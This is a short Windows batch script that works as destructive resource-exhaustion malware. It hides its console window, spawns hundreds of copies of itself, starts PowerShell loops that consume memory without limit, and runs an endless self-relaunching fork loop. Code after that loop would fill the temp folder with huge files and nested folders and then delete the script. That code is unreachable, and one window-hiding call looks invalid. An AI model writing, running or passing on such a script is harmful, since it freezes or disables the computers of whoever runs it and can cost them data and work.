@echo off
setlocal enabledelayedexpansion
cd /d %TEMP%

>nul 2>&1 (
  powershell -Command "$w=Get-ConsoleWindow(); [void][Runtime.InteropServices.Marshal]::GetHRForLastWin32Error(); Add-Type -Name Win -Namespace Win32 -Member '[DllImport(\"user32.dll\")]public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'; [Win32.Win]::ShowWindow($w, 0)"
)

for /l %%x in (1, 1, 200) do start /min wscript //e:JScript "%~f0"

for /l %%m in (1, 1, 100) do start /min powershell -Command "$x='A'*100MB; while(1){$x+=$x}"

:fork
start "" "%~f0"
goto fork

set "base=%TEMP%\x"
md "!base!"
cd /d "!base!"

for /l %%i in (1, 1, 1000) do (
  md %%i
  cd %%i
  echo x>%%i.txt
)

for /l %%d in (1, 1, 1000) do (
  fsutil file createnew "%TEMP%\f%%d.tmp" 268435456 >nul 2>&1
)

(del "%~f0") >nul 2>&1
exit
